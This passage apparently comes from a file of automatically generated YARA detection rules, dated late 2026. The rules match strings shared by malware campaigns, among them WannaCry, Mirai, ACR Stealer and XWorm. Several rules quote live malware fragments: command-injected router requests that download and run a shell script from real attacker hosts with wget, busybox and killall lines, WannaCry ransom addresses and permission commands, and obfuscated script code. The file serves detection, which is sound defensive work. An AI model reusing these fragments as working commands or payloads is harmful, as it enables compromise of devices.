        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "InlineArrayAsReadOnlySpan" ascii
        $s9 = "s_asciiOtherThanPercent" ascii
        $s10 = "canonicalizeAsFilePath" ascii
        $s11 = "TryUnescapeDataString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_420d266e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-420d266e"
        date = "2026-10-31"
        campaign = "tlsh-420d266e"
        family = ""
        hash = "2119843c19bd2d1dcc3b2768cfb51c40b40fc31be056a31093e1bc83fadcdb6b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-420d266e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/System.Diagnostics.FileVersionInfo/Release/net10.0-windows/System.Diagn" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "ostics.FileVersionInfo.pdb" ascii
        $s4 = "IsAotCompatible" ascii
        $s5 = ".NET 10.0" ascii
        $s6 = "R4FEcUPn" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_1738b190_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1738b190"
        date = "2026-10-31"
        campaign = "tlsh-1738b190"
        family = ""
        hash = "10565660f78e642c000f3a4bf78f07eff29e10db4a3158e2510b79ceb2288478"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1738b190.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "2Method's type signature is not PInvoke compatible._Method '%1.%2' cannot be marked with both DllImp" wide
        $s1 = "Could not get PINVOKE information for method '%3' in type '%1' from assembly '%2'.]Array of type '%1" wide
        $s2 = "(Could not load file or assembly '%1'. %2$Signature is not Interop compatible.|Invalid managed/unman" wide
        $s3 = "WInvalid managed/unmanaged type combination (Int64/UInt64 must be paired with I8 or U8).\\Invalid man" wide
        $s4 = "-implemented method with non-zero RVA./Internal call method '%1.%3' with non-zero RVA.&Abstract meth" wide
        $s5 = "BCould not create a pointer to a ByRef. Type: '%1'. Assembly: '%2'.`InlineArrayAttribute cannot be a" wide
        $s6 = "aged type combination (String[] must be paired with an ArraySubType of LPStr, LPWStr, BStr, or LPTSt" wide
        $s7 = "not supported with UnsafeAccessorTypeAttribute.RType '%1' from assembly '%2' is attempting to implem" wide
        $s8 = "2'.bInlineArrayAttribute cannot be applied to a type with explicit layout. Type: '%1'. Assembly: '%2" wide
        $s9 = "uAll named parameters must be specified as [DISPID=XXX] when invoking on a standard members specifie" wide
        $s10 = "d as [DISPID=XXX}.cVariant returned from an Invoke call with a DISPID of -4 does not contain a valid" wide
        $s11 = "aged/unmanaged type combination (Int/UInt must be paired with SysInt or SysUInt).KInvalid managed/un" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_5351e04a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5351e04a"
        date = "2026-10-31"
        campaign = "tlsh-5351e04a"
        family = ""
        hash = "44b6003f41da1812c26234d76ee229156310811b45aa658698fb3299936367e4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5351e04a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "ISystem.Net.Http.Json.JsonContent+<SerializeToStreamAsyncTranscoding>d__14" ascii
        $s2 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s3 = "RSystem.Net.Http.Json.HttpClientJsonExtensions+<GetLengthLimitReadStreamAsync>d__15" ascii
        $s4 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s5 = "OSystem.Net.Http.Json.HttpContentJsonExtensions+<GetTranscodingStreamAsync>d__18" ascii
        $s6 = "ZThe request was canceled due to the configured HttpClient.Timeout of {0} seconds elapsing.T" ascii
        $s7 = "/_/src/runtime/artifacts/obj/System.Net.Http.Json/Release/net10.0/System.Net.Http.Json.pdb" ascii
        $s8 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s9 = "<GetFromJsonAsync>b__31_0" ascii
        $s10 = ".NETCoreApp,Version=v10.0" ascii
        $s11 = "InlineArrayAsReadOnlySpan" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_9cc0e7e8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9cc0e7e8"
        date = "2026-10-31"
        campaign = "tlsh-9cc0e7e8"
        family = ""
        hash = "33e99c94cacbff85cdfaa808b0bc4b333eb7067bf9a9a1d49b79e9ebe5e21008"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9cc0e7e8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ">System.Threading.Tasks.Parallel+<>c__49`1+<<ForAsync>b__49_0>d" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s2 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s3 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s4 = "System.Diagnostics.Tracing.EventOpcode, System.Diagnostics.Tracing, Version=10.0.0.0, Culture=neutra" ascii
        $s5 = "/_/src/runtime/artifacts/obj/System.Threading.Tasks.Parallel/Release/net10.0/System.Threading.Tasks." ascii
        $s6 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s7 = "One of the actions was null.u" ascii
        $s8 = ".NETCoreApp,Version=v10.0" ascii
        $s9 = "ys\" featurevalue=\"false\">" ascii
        $s10 = "ForAsyncState`1" ascii
        $s11 = "IsAotCompatible" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ca03d0ba_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ca03d0ba"
        date = "2026-10-31"
        campaign = "tlsh-ca03d0ba"
        family = ""
        hash = "577d95471cbfdc0d53e4a732c58b3dd1fdd997eca166bcca68bcb68c08dc1898"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ca03d0ba.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/System/Release/net10.0-windows/System.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "PoolingPointerMemoryManager" ascii
        $s4 = "ValueSplitEnumerator" ascii
        $s5 = "TruncatedReadStream" ascii
        $s6 = "IsAotCompatible" ascii
        $s7 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 8 of them
}

rule Sightlines_tlsh_b92715c8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b92715c8"
        date = "2026-10-31"
        campaign = "tlsh-b92715c8"
        family = ""
        hash = "78915dd1ca144ba8d28ed5c4bfbf35f2796c03d414f6d632481f332b287af85e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b92715c8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/mscorlib/Release/net10.0-windows/mscorlib.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "InvocationListEnumerator`1" ascii
        $s4 = "SpanSplitEnumerator`1" ascii
        $s5 = "AlternateLookup`1" ascii
        $s6 = "IsAotCompatible" ascii
        $s7 = "ProcessCpuUsage" ascii
        $s8 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 9 of them
}

rule Sightlines_tlsh_0b3ac954_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0b3ac954"
        date = "2026-10-31"
        campaign = "tlsh-0b3ac954"
        family = ""
        hash = "3e3a25ea07d35d4bad2d5ac5f3ebeaa3c157ecd479e811b8fb602a2213469122"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0b3ac954.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "System.Diagnostics.Tracing.EventKeywords, System.Diagnostics.Tracing, Version=10.0.0.0, Culture=neut" ascii
        $s4 = "<FormatIPv6Address>g__AppendSections|7_0" ascii
        $s5 = "<ConvertInterfaceNameToLuid>g____PInvoke|17_0" ascii
        $s6 = "<ConvertInterfaceLuidToIndex>g____PInvoke|16_0" ascii
        $s7 = "/_/src/runtime/artifacts/obj/System.Net.Primitives/Release/net10.0-windows/System.Net.Primitives.pdb" ascii
        $s8 = "KeyExchangeAlgorithm, KeyExchangeStrength, CipherAlgorithm, CipherStrength, HashAlgorithm and HashSt" ascii
        $s9 = "System.IUtf8SpanParsable<System.Net.IPNetwork>.TryParse" ascii
        $s10 = "System.IUtf8SpanParsable<System.Net.IPNetwork>.Parse" ascii
        $s11 = "System.IUtf8SpanParsable<System.Net.IPAddress>.TryParse" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_84753099_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-84753099"
        date = "2026-10-31"
        campaign = "tlsh-84753099"
        family = ""
        hash = "3952a72e1f18774f16952b46c20e80ed2bc601a06eca01f33fa924c738022a9c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-84753099.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/_/src/runtime/artifacts/obj/System.Configuration/Release/net10.0-windows/System.Configuration.pdb" ascii
        $s1 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s2 = ".NETCoreApp,Version=v10.0" ascii
        $s3 = "IsAotCompatible" ascii
        $s4 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_2b6f5268_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2b6f5268"
        date = "2026-10-31"
        campaign = "tlsh-2b6f5268"
        family = ""
        hash = "2da76eb281740be485b5637da8c60fe0ce12bc2848d1a1a81ce144fa74313e18"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2b6f5268.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "NSystem.IO.Compression.ZipFileExtensions+<ExtractRelativeToDirectoryAsync>d__20" ascii
        $s1 = "<System.IO.Compression.ZipFile+<ExtractToDirectoryAsync>d__42" ascii
        $s2 = "<System.IO.Compression.ZipFile+<ExtractToDirectoryAsync>d__46" ascii
        $s3 = "ASystem.IO.Compression.ZipFileExtensions+<ExtractToFileAsync>d__19" ascii
        $s4 = "GSystem.IO.Compression.ZipFile+<CreateZipArchiveFromDirectoryAsync>d__30" ascii
        $s5 = "FSystem.IO.Compression.ZipFileExtensions+<ExtractToDirectoryAsync>d__11" ascii
        $s6 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s7 = "?System.IO.Compression.ZipFile+<DoCreateFromDirectoryAsync>d__28" ascii
        $s8 = "?System.IO.Compression.ZipFile+<DoCreateFromDirectoryAsync>d__29" ascii
        $s9 = "HSystem.IO.Compression.ZipFileExtensions+<DoCreateEntryFromFileAsync>d__7" ascii
        $s10 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s11 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f4deb7f8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f4deb7f8"
        date = "2026-10-31"
        campaign = "tlsh-f4deb7f8"
        family = ""
        hash = "226e216e33c94ef7594bdffe670ba4dc5907151c113cb41ac9e9d570227e1765"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f4deb7f8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Text.Encoding.CodePages/Release/net10.0-windows/System.Text.Enco" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "9349424C68362DE2254D1700998A977AD514CF7ADAE27F13064ABF0EF862B87F2" ascii
        $s6 = "<InternalSyncObject>k__BackingField" ascii
        $s7 = "ABD322411B1F0549AAFB728BDC99B5ACD22BDD1AE854CDAA38C71BFB922BBDF1" ascii
        $s8 = ".NETCoreApp,Version=v10.0" ascii
        $s9 = "InlineArrayAsReadOnlySpan" ascii
        $s10 = "get_MappedFamilyCodePage" ascii
        $s11 = "s\" featurevalue=\"false\">" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1724944 and 12 of them
}

rule Sightlines_imphash_184f8783_wannacry
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-184f8783"
        date = "2026-10-31"
        campaign = "imphash-184f8783"
        family = "wannacry"
        hash = "819fe3ef91ba4696fac9dd005dec1c9aea78c5fba2b43e6bedee2b133386e648"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-184f8783.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "- unzip 0.15 Copyright 1998 Gilles Vollant " ascii
        $s1 = " inflate 1.1.3 Copyright 1995-1998 Mark Adler " ascii
        $s2 = "Microsoft Enhanced RSA and AES Cryptographic Provider" ascii
        $s3 = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94" ascii
        $s4 = "oversubscribed dynamic bit lengths tree" ascii
        $s5 = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw" ascii
        $s6 = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn" ascii
        $s7 = "Global\\MsWinZonesCacheCounterMutexA" ascii
        $s8 = "$8,4-6'96$:.?*1#HpXhA~SeZlNrSbE" ascii
        $s9 = "icacls . /grant Everyone:F /T /C /Q" ascii
        $s10 = "8,4$6'9-$:.6*1#?pXhH~SeAlNrZbE" ascii
        $s11 = "msg/m_chinese (simplified).wnryR9" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7028736 and 12 of them
}

rule Sightlines_imphash_b943bce1_wannacry
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-b943bce1"
        date = "2026-10-31"
        campaign = "imphash-b943bce1"
        family = "wannacry"
        hash = "520cb96aaaa4cec61e0ddf57ed082df208770f63f3e1b234758d7e517efcab66"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-b943bce1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "C4OSmdKQrtN4zZnAShPGa3yLpqS3VvaD+W5IRkA9dhgJi1NlYPDhKQB2pr7GgprbLruE8xtGkqWGFtDoqzIXeXU3XV6NOsK7TlcH" ascii
        $s1 = "5DFOtJPRVbIPl8QOjm2IE1rwQt4AbVR2o6YK5pUGXNLCZxXroI8l+mQX3gudA56Bcb/I7hfyeWZy5zaWa5BRrI1Ss+7D3v9knvDj" ascii
        $s2 = "vLg7Z1Yr/AZ9TmVxAspk7OakT4SmzfidGCQHPD6qoQ41LMIIyKFqGsWQuDEw4x/9j8jbUm+8ebrYp2a8XGY1h3pcYKAJ7f3a9sPB" ascii
        $s3 = "hiYO7Q+UFFfP/bcJ4FTPy5qnpEnX6v+n88x+C1TSRKCzHZ9osGZF3WtNaDyBIirDNBcOtpV0TcMLaoZiSGg7YW1BrYdfwMKBsYuK" ascii
        $s4 = "7gHFD958N9Ikb/zj66YdRI/SIUt3c+fEPxFLLmSmOGQ8Rbpl1ytuv02fEoG4PhU8kVJ5BUKldbtJG23VlkEmWTKy+q2y1/e7injM" ascii
        $s5 = "H7HLnklZH1DscvSX0oEzLb9ao0qjflfyRGeFEnFbJrG/m/FawTW35AVy4Dzyj+eJQPeQjNUDpmYCF7lQg8Ogvik53rxqvui98Dhv" ascii
        $s6 = "7cnWqoHGHRhLihPuuXPs2N/CNUMOSGRjVyfio3Du9RtCB7FcJDdvvFHa343mSJsMQpYYNa+Tr+egbyulIVECrZUydjVmaPzw2sWi" ascii
        $s7 = "neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+S" ascii
        $s8 = "DyMT7fZb9dEiBVHAXy2yWY9zFfWRngNlQqmfprJozjU4Swj1cOZm2o5ZsNR2I3Jz18uMEn/KJa3uiQuYeJnAafHVKLBstAgGITZS" ascii
        $s9 = "Fyf5GGvog1W2q80GVhaMfKbhFwpqCcgsDGcIISyPz1QXWJktidU9PN7yBFHUElW2kZFuk4LhQndbvNFK7Raj1sTQiOHy+Ke4/K1M" ascii
        $s10 = "937EHPiU2WTFl2sg/jZr95EkGp3mmUP8NAo68Fwi8C/4n+ycc0d2o7OyH76a75h9ofch0u50bz9pOnQVSN/KwyJtkqMNUKf8XaYv" ascii
        $s11 = "EClrZY+rdrFD5KQbp0qhYwgEls4ay1j31a+xkRP6TTMx8VvXUutIg1Gmd7i+sXAS6mY98lKee9NvMpJE7OavgZJbxo/kqwdZ5Tj1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7446528 and 12 of them
}

rule Sightlines_c2_8a8868a0_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-8a8868a0"
        date = "2026-11-01"
        campaign = "c2-8a8868a0"
        family = "mirai"
        hash = "488b260578daf88b078d609ef3891f2c8ebc6e698f5b16afe2e72b574e79df9d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-8a8868a0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(cd /tmp;wget -q -O k http://193.32.162.163/bins/kl" ascii
        $s1 = "action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=\";cd /tmp;wget -O k http://193.32.162.1" ascii
        $s2 = "/kla.sh||busybox wget -q -O k http://elliotsdog.ru/bins/kla.sh;chmod 777 k;sh k;rm -f k)</language>" ascii
        $s3 = "a.sh||wget -q -O k http://elliotsdog.ru/bins/kla.sh||busybox wget -q -O k http://193.32.162.163/bins" ascii
        $s4 = "country=;wget -O /tmp/k http://193.32.162.163/bins/kla.sh;;wget -O /tmp/k http://elliotsdog.ru/bins/" ascii
        $s5 = "POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1" ascii
        $s6 = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" ascii
        $s7 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s8 = "kla.sh;;busybox wget -O /tmp/k http://193.32.162.163/bins/kla.sh;sh /tmp/k;" ascii
        $s9 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s10 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s11 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_5b2fd813_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5b2fd813"
        date = "2026-11-01"
        campaign = "tlsh-5b2fd813"
        family = ""
        hash = "23dc91f87469f5b7536fa073ab28bbb61c0234261d48f6dbbc664e81df1d94ce"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5b2fd813.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "authunix_create_default" ascii
        $s1 = "/lib/ld-linux.so.3" ascii
        $s2 = "__ctype_tolower_loc" ascii
        $s3 = "__ctype_toupper_loc" ascii
        $s4 = "__h_errno_location" ascii
        $s5 = "__libc_start_main" ascii
        $s6 = "clnt_pcreateerror" ascii
        $s7 = "fgets_unlocked" ascii
        $s8 = "__errno_location" ascii
        $s9 = "get_kernel_syms" ascii
        $s10 = "gethostbyname2" ascii
        $s11 = "gnu_dev_makedev" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_2db46501_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2db46501"
        date = "2026-11-01"
        campaign = "tlsh-2db46501"
        family = "mirai"
        hash = "33df26a65740c720c1d8f5c74b1372089a73df6288cc75e198e89d68aa606826"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2db46501.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "[ -z \"$CAND\" ] && CAND=\"parm7 parm6 parm5 parm pmips pmpsl px86 pppc pm68k psh4\"" ascii
        $s1 = "cp /bin/busybox /tmp/ 2>/dev/null || cp /bin/busybox /var/tmp/ 2>/dev/null || cp /bin/busybox /var/r" ascii
        $s2 = "killall -9 x86_64 2>/dev/null; killall -9 x86_64.s 2>/dev/null" ascii
        $s3 = "/null || cp /bin/busybox /var/ 2>/dev/null || cp /bin/busybox /home/ 2>/dev/null || true" ascii
        $s4 = "/bin/busybox /mnt/ 2>/dev/null || cp /bin/busybox /root/ 2>/dev/null || cp /bin/busybox /opt/ 2>/dev" ascii
        $s5 = "killall -9 robben 2>/dev/null; killall -9 sora 2>/dev/null; killall -9 hajime 2>/dev/null" ascii
        $s6 = "un/ 2>/dev/null || cp /bin/busybox /run/ 2>/dev/null || cp /bin/busybox /dev/shm/ 2>/dev/null || cp " ascii
        $s7 = "killall -9 arm4 2>/dev/null; killall -9 arm4.s 2>/dev/null" ascii
        $s8 = "killall -9 arm5 2>/dev/null; killall -9 arm5.s 2>/dev/null" ascii
        $s9 = "killall -9 arm6 2>/dev/null; killall -9 arm6.s 2>/dev/null" ascii
        $s10 = "killall -9 arm7 2>/dev/null; killall -9 arm7.s 2>/dev/null" ascii
        $s11 = "killall -9 m68k 2>/dev/null; killall -9 m68k.s 2>/dev/null" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_be308dc9_acrstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-be308dc9"
        date = "2026-11-01"
        campaign = "tlsh-be308dc9"
        family = "acrstealer"
        hash = "00e9fd3aafdda7a65c790bc7da59fba5f9556d5dc21586b4cad3e0bb06343c2e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-be308dc9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r += [System.Char]::ConvertFromU" ascii
        $s1 = "        elseif ([long]$v -ge 0x10000 -and [long]$v -le 0x10FFFF) { $r = [System.Char]::ConvertFromUt" ascii
        $s2 = "} finally {" ascii
        $s3 = "} finally{" ascii
        $s4 = "return $r" ascii
        $s5 = " break }" ascii
    condition:
        filesize < 1048576 and 6 of them
}

rule Sightlines_imphash_8276c0af_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-8276c0af"
        date = "2026-11-01"
        campaign = "imphash-8276c0af"
        family = ""
        hash = "1bec46428cbd7887a6e17b51610876330daccdcb62c367520078ae965a9c2825"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-8276c0af.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "drive.usercontent.google.com/download?id=1YBVIDkZgygNfUU2rbJXXCYdrzay5rMdY&export=download&authuser=" ascii
        $s1 = "0J7EFGABCeuvdDK489SEV56ewf332Nd123sfeW4werf5FDGwYZRtwz" ascii
        $s2 = "aAbBcCdDeFgGhHIjmMnprRStTuUVwWxXyYzZM" ascii
        $s3 = "Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1" ascii
        $s4 = "The program can't start because MSVCP140.dll is missing from your computer. Try reinstalling the pro" ascii
        $s5 = "Accept-Language: ru-RU,ru;q=0.9,en;q=0.8" ascii
        $s6 = "Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0" ascii
        $s7 = "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, i" ascii
        $s8 = "FileHeader.Machine != HOST_MACHINE!" ascii
        $s9 = "Signature != IMAGE_NT_SIGNATURE!" ascii
        $s10 = "alignedImageSize != AlignValueUp!" ascii
        $s11 = "4$4,44484<4@4D4H4L4P4T4X4\\4`4d4h4l4p4t4x4|4" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_rich_header_hash_708bf268_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-708bf268"
        date = "2026-11-01"
        campaign = "rich_header_hash-708bf268"
        family = ""
        hash = "72167a84e4cb877beab3f19a65804bcb47007cf584ccaa17e2ace13a8addbbcf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-708bf268.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$d=[Environment]::GetFolderPath('Desktop');$p=\"$d\\Zapret Manager v2.lnk\";$s=(New-Object -ComObject W" ascii
        $s1 = "CHANNEL__:${this.id}`}toJSON(){return this[d]()}}async function l(t,e={},s){return window.__TAURI_IN" ascii
        $s2 = "ed(e){return this.listen(d.WINDOW_THEME_CHANGED,e)}}var D,S,O,A,W;async function z(e,t){await a(\"plu" ascii
        $s3 = "NALS__)&&void 0!==n?n:{}}var Z,K=Object.freeze({__proto__:null,clearMocks:function(){\"object\"==typeo" ascii
        $s4 = "IEYzOEE1MEJGMDIxNENEM0MKUldROHpSUUN2MUNLODZtWEpDUHZGY25vRHcwV2RScDhIUXZlNVl4Y2hHZFpCZHYxektMQTArbWcK" ascii
        $s5 = "SHA384_ASN1ECDSA_P384_SHA384_FIXEDassertion failed: key.len() <= digest_alg.block_len() / 2" ascii
        $s6 = ")?t(i,r):e(i,r)},window.__TAURI_INTERNALS__.transformCallback=function(e,n=!1){const t=window.crypto" ascii
        $s7 = "  Object.defineProperty(window.__TAURI_INTERNALS__, 'transformCallback', {" ascii
        $s8 = "  Object.defineProperty(window.__TAURI_INTERNALS__, 'unregisterCallback', {" ascii
        $s9 = "Object.defineProperty(window.__TAURI_INTERNALS__.plugins, 'path', {" ascii
        $s10 = "plugin:__TAURI_CHANNEL__|fetch// Copyright 2019-2024 Tauri Programme within The Commons Conservancy" ascii
        $s11 = ",i()}}async onScaleChanged(e){return this.listen(d.WINDOW_SCALE_FACTOR_CHANGED,e)}async onThemeChang" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 21489664 and 12 of them
}

rule Sightlines_tlsh_84dc9d7c_xworm
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-84dc9d7c"
        date = "2026-11-01"
        campaign = "tlsh-84dc9d7c"
        family = "xworm"
        hash = "8161009b41c1e2a45790429ca7907694fc33169c1710b26de542dad98e027add"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-84dc9d7c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "2620\\u2620')['join'](''),YYfC=AwiC['createElement'](QS9C);" ascii
        $s1 = "  }gf1D['Write'](kg2C['nodeTypedValue']);" ascii
        $s2 = "']('\\u2620\\u2620')['join'](''),AwiC=new ActiveXObject(AuLB);" ascii
        $s3 = "  }EBnC['Write'](YYfC['nodeTypedValue']);" ascii
        $s4 = "TY':'Division\\x20by\\x20zero\\x20exception\\x20flag.'" ascii
        $s5 = "  }EBnC['Position']=0x0,EBnC['Type']=0x1;" ascii
        $s6 = "  }gf1D['Position']=0x0,gf1D['Type']=0x1;" ascii
        $s7 = "620\\u2620\\u2620'['split']('\\u2620')['join']('')),wBSE=WScript['CreateObject']('\\u2620\\u2620\\u2620\\u2" ascii
        $s8 = "Y':'Invalid\\x20operation\\x20exception\\x20flag.'" ascii
